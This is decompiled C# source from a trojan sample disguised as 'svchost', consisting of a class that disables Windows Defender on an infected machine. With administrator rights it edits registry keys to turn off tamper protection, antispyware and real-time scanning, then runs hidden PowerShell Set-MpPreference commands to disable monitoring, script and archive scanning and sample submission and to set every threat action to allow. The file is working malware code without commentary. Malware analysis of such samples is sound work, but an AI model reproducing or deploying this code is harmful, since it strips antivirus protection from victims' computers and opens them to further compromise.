// Decompiled with JetBrains decompiler
// Type: svchost.Antis.DisableWD
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Security.Principal;

namespace svchost.Antis
{
  [OptionText]
  public class DisableWD
  {
    public void Run()
    {
      if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        return;
      DisableWD.RegistryEdit("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
      DisableWD.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
      DisableWD.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
      DisableWD.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
      DisableWD.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
      DisableWD.CheckDefender();
    }

    private static void RegistryEdit(string regPath, string name, string value)
    {
      try
      {
        using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
        {
          if (registryKey == null)
          {
            Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, (object) value, RegistryValueKind.DWord);
          }
          else
          {
            if (!Operators.ConditionalCompareObjectNotEqual(registryKey.GetValue(name), (object) value, true))
              return;
            registryKey.SetValue(name, (object) value, RegistryValueKind.DWord);
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void CheckDefender()
    {
      Process process = new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = "powershell",
          Arguments = "Get-MpPreference -verbose",
          UseShellExecute = false,
          RedirectStandardOutput = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true
        }
      };
      process.Start();
      while (!process.StandardOutput.EndOfStream)
      {
        string str = process.StandardOutput.ReadLine();
        if (str.StartsWith("DisableRealtimeMonitoring") && str.EndsWith("False"))
          DisableWD.RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
        else if (str.StartsWith("DisableBehaviorMonitoring") && str.EndsWith("False"))
          DisableWD.RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
        else if (str.StartsWith("DisableBlockAtFirstSeen") && str.EndsWith("False"))
          DisableWD.RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
        else if (str.StartsWith("DisableIOAVProtection") && str.EndsWith("False"))
          DisableWD.RunPS("Set-MpPreference -DisableIOAVProtection $true");
        else if (str.StartsWith("DisablePrivacyMode") && str.EndsWith("False"))
          DisableWD.RunPS("Set-MpPreference -DisablePrivacyMode $true");
        else if (str.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && str.EndsWith("False"))
          DisableWD.RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
        else if (str.StartsWith("DisableArchiveScanning") && str.EndsWith("False"))
          DisableWD.RunPS("Set-MpPreference -DisableArchiveScanning $true");
        else if (str.StartsWith("DisableIntrusionPreventionSystem") && str.EndsWith("False"))
          DisableWD.RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true");
        else if (str.StartsWith("DisableScriptScanning") && str.EndsWith("False"))
          DisableWD.RunPS("Set-MpPreference -DisableScriptScanning $true");
        else if (str.StartsWith("SubmitSamplesConsent") && !str.EndsWith("2"))
          DisableWD.RunPS("Set-MpPreference -SubmitSamplesConsent 2");
        else if (str.StartsWith("MAPSReporting") && !str.EndsWith("0"))
          DisableWD.RunPS("Set-MpPreference -MAPSReporting 0");
        else if (str.StartsWith("HighThreatDefaultAction") && !str.EndsWith("6"))
          DisableWD.RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force");
        else if (str.StartsWith("ModerateThreatDefaultAction") && !str.EndsWith("6"))
          DisableWD.RunPS("Set-MpPreference -ModerateThreatDefaultAction 6");
        else if (str.StartsWith("LowThreatDefaultAction") && !str.EndsWith("6"))
          DisableWD.RunPS("Set-MpPreference -LowThreatDefaultAction 6");
        else if (str.StartsWith("SevereThreatDefaultAction") && !str.EndsWith("6"))
          DisableWD.RunPS("Set-MpPreference -SevereThreatDefaultAction 6");
      }
    }

    private static void RunPS(string args) => new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell",
        Arguments = args,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      }
    }.Start();
  }
}
